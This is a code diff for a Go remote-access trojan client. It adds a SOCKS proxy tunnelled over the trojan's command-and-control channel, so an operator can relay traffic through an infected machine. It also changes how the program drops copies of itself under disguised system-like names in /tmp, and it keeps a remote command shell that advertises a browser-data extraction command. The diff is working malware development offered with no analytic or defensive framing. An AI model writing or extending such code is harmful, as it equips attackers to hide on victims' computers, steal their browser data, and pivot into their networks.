@@ -344,6 +344,135 @@ type Resp struct {
 	Type, Content string
 }
 
+// socksWire is the multiplexed SOCKS relay framing over the C2 JSON line protocol.
+type socksWire struct {
+	Type  string `json:"type"`
+	ID    uint32 `json:"id"`
+	Host  string `json:"host,omitempty"`
+	Port  int    `json:"port,omitempty"`
+	Data  string `json:"data,omitempty"`
+	Error string `json:"error,omitempty"`
+}
+
+var (
+	socksMu     sync.Mutex
+	socksConns  = make(map[uint32]net.Conn)
+	socksC2Mu   sync.Mutex
+	socksC2Conn net.Conn
+)
+
+func setSocksC2(c net.Conn) {
+	socksC2Mu.Lock()
+	socksC2Conn = c
+	socksC2Mu.Unlock()
+}
+
+func socksSend(msg socksWire) {
+	socksC2Mu.Lock()
+	c := socksC2Conn
+	socksC2Mu.Unlock()
+	if c == nil {
+		return
+	}
+	_ = sendData(c, msg)
+}
+
+func socksCloseAll() {
+	socksMu.Lock()
+	ids := make([]uint32, 0, len(socksConns))
+	for id, c := range socksConns {
+		ids = append(ids, id)
+		_ = c.Close()
+		delete(socksConns, id)
+	}
+	socksMu.Unlock()
+	for _, id := range ids {
+		socksSend(socksWire{Type: "socks_close", ID: id})
+	}
+}
+
+func handleSocksMsg(msg socksWire) {
+	typ := strings.ToLower(msg.Type)
+	switch typ {
+	case "socks_open":
+		go socksOpen(msg.ID, msg.Host, msg.Port)
+	case "socks_data":
+		socksWrite(msg.ID, msg.Data)
+	case "socks_close":
+		socksCloseLocal(msg.ID, false)
+	}
+}
+
+func socksOpen(id uint32, host string, port int) {
+	if host == "" || port < 1 || port > 65535 {
+		socksSend(socksWire{Type: "socks_fail", ID: id, Error: "invalid host/port"})
+		return
+	}
+	addr := net.JoinHostPort(host, strconv.Itoa(port))
+	c, err := net.DialTimeout("tcp", addr, 20*time.Second)
+	if err != nil {
+		socksSend(socksWire{Type: "socks_fail", ID: id, Error: err.Error()})
+		return
+	}
+	socksMu.Lock()
+	if old, ok := socksConns[id]; ok {
+		_ = old.Close()
+	}
+	socksConns[id] = c
+	socksMu.Unlock()
+	socksSend(socksWire{Type: "socks_ok", ID: id})
+	go socksReadLoop(id, c)
+}
+
+func socksWrite(id uint32, b64 string) {
+	raw, err := base64.StdEncoding.DecodeString(b64)
+	if err != nil || len(raw) == 0 {
+		return
+	}
+	socksMu.Lock()
+	c := socksConns[id]
+	socksMu.Unlock()
+	if c == nil {
+		return
+	}
+	if _, err := c.Write(raw); err != nil {
+		socksCloseLocal(id, true)
+	}
+}
+
+func socksCloseLocal(id uint32, notify bool) {
+	socksMu.Lock()
+	c, ok := socksConns[id]
+	if ok {
+		delete(socksConns, id)
+	}
+	socksMu.Unlock()
+	if ok {
+		_ = c.Close()
+	}
+	if notify {
+		socksSend(socksWire{Type: "socks_close", ID: id})
+	}
+}
+
+func socksReadLoop(id uint32, c net.Conn) {
+	buf := make([]byte, 12*1024)
+	for {
+		n, err := c.Read(buf)
+		if n > 0 {
+			socksSend(socksWire{
+				Type: "socks_data",
+				ID:   id,
+				Data: base64.StdEncoding.EncodeToString(buf[:n]),
+			})
+		}
+		if err != nil {
+			socksCloseLocal(id, true)
+			return
+		}
+	}
+}
+
 func hideTerminal() {
 	platformHideTerminal()
 }
@@ -391,13 +520,14 @@ func makeCopy() string {
 			}
 		}
 	} else {
+		// Linux: drop a no-extension binary under /tmp; keep the original on disk
 		randomName := makeRandomName()
 		copyPath = filepath.Join("/tmp", randomName)
 		input, err := os.ReadFile(exePath)
 		if err == nil {
-			os.WriteFile(copyPath, input, 0755)
-			os.Remove(exePath) // Delete original after copy
-			return copyPath
+			if err := os.WriteFile(copyPath, input, 0755); err == nil {
+				return copyPath
+			}
 		}
 	}
 	return exePath
@@ -727,11 +857,22 @@ func removePersistence() {
 
 func isAppMode() bool {
 	exePath, _ := os.Executable()
+	base := filepath.Base(exePath)
 
 	appNames := getAppNames()
 	for _, name := range appNames {
-		if strings.Contains(exePath, name) {
+		if name == "" {
+			continue
+		}
+		if strings.Contains(exePath, name) || strings.EqualFold(base, name) {
 			return true
+		}
+		// Linux builds may strip .exe from obfuscated Windows app names
+		if runtime.GOOS != "windows" {
+			trimmed := strings.TrimSuffix(name, ".exe")
+			if trimmed != name && (strings.Contains(exePath, trimmed) || strings.EqualFold(base, trimmed)) {
+				return true
+			}
 		}
 	}
 
@@ -740,8 +881,9 @@ func isAppMode() bool {
 
 	for _, prefix := range prefixes {
 		for _, suffix := range suffixes {
-			expectedName := prefix + suffix + ".exe"
-			if strings.Contains(exePath, expectedName) {
+			winName := prefix + suffix + ".exe"
+			nixName := strings.ToLower(prefix + suffix)
+			if strings.Contains(exePath, winName) || strings.EqualFold(base, nixName) {
 				return true
 			}
 		}
@@ -772,11 +914,15 @@ func initAppMode() {
 	}
 }
 
+var c2WriteMu sync.Mutex
+
 func sendData(conn net.Conn, data interface{}) error {
 	jsonData, err := json.Marshal(data)
 	if err != nil {
 		return err
 	}
+	c2WriteMu.Lock()
+	defer c2WriteMu.Unlock()
 	_, err = conn.Write(append(jsonData, '\n'))
 	return err
 }
@@ -1121,10 +1267,15 @@ func makeRandomName() string {
 	prefixes := []string{"App", "System", "Update", "Service", "Process", "Manager", "Handler", "Controller", "Monitor", "Agent"}
 	suffixes := []string{"Starter", "Processor", "Manager", "Service", "Handler", "Controller", "Monitor", "Agent", "Helper", "Worker"}
 
-	prefix := prefixes[time.Now().UnixNano()%int64(len(prefixes))]
-	suffix := suffixes[time.Now().UnixNano()%int64(len(suffixes))]
-
-	return fmt.Sprintf("%s%s.exe", prefix, suffix)
+	n := time.Now().UnixNano()
+	prefix := prefixes[n%int64(len(prefixes))]
+	suffix := suffixes[(n/7)%int64(len(suffixes))]
+	base := prefix + suffix
+	if runtime.GOOS == "windows" {
+		return base + ".exe"
+	}
+	// Linux/macOS: no .exe — looks like a normal binary name
+	return strings.ToLower(base)
 }
 
 func runCommand(command string) string {
@@ -2559,11 +2710,25 @@ func handleShell(conn net.Conn) {
 	response := Resp{Type: "response", Content: fmt.Sprintf("Client connected successfully!\nHostname: %s\nUser: %s\nSession: %s\n\nReady for commands. Use 'extractbrowserhidden' to extract browser data when needed.", getHostname(), getUsername(), makeSessionID())}
 	sendData(conn, response)
 
+	setSocksC2(conn)
+	defer func() {
+		socksCloseAll()
+		setSocksC2(nil)
+	}()
+
 	for {
 		command, err := recvData(conn)
 		if err != nil {
 			return
 		}
+
+		// SOCKS mux frames (must not go through normal command handler)
+		var sw socksWire
+		if json.Unmarshal([]byte(command), &sw) == nil && strings.HasPrefix(strings.ToLower(sw.Type), "socks_") {
+			handleSocksMsg(sw)
+			continue
+		}
+
 		var cmd Cmd
 		err = json.Unmarshal([]byte(command), &cmd)
 		if err != nil {
